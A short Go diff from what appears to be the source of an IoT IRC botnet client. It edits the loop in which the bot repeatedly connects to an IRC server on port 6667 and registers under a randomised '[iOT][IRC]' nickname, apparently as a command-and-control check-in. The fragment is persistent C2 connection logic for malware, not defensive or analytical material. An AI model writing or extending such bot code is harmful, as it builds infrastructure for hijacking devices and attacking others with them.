@@ -23,16 +23,17 @@ func NeverExit(f func()) {
 func notexit() {
 
 	for {
-		// server := "1.1.1.1:80"
+		// server := "1.1.1.1:6667"
 	CONNS:
-		connection, err := net.Dial("tcp", ":80")
+		connection, err := net.Dial("tcp", ":6667")
 		if err != nil {
 			log.Fatal(err)
 			goto CONNS
 		}
-		defer connection.Close()
+
 		connection.Write([]byte("NICK [iOT][IRC][" + utils.RandomString(5, false) + "]\r\n"))
 		connection.Write([]byte("USER linux linux linux :The LinuxXD\r\n"))
+		defer connection.Close()
 
 		reader := bufio.NewReader(connection)
 		tp := textproto.NewReader(reader)
